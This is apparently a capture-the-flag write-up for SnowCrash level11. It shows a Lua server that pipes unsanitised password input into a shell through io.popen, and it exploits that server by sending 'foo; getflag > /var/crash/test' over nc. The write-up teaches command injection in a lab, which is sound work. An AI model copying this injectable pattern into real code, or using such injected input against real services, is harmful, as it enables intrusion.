## Observation

```bash
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
level11@SnowCrash:~$ 

```

This is a Lua TCP server on 127.0.0.1:5151.
hash(pass) uses io.popen("echo "..pass.." | sha1sum") — .. in lua means concatenates strings.
we saw that the shell command shasum is used, so we now that shell command can be injected. (there is no sanitization of the input)

## Methods

-> We will connect to the server throught nc. And inject the command getflag when the field "password" is ask.

We can ask that the result shuld be write in a file. 
after that we will cat the file.

```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151 
Password: foo; getflag > /var/crash/test
Erf nope..
level11@SnowCrash:~$ cat /var/crash/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

-> It says `Erf nope` because foo is not the right passeword, but the command has been executed and you have the flag.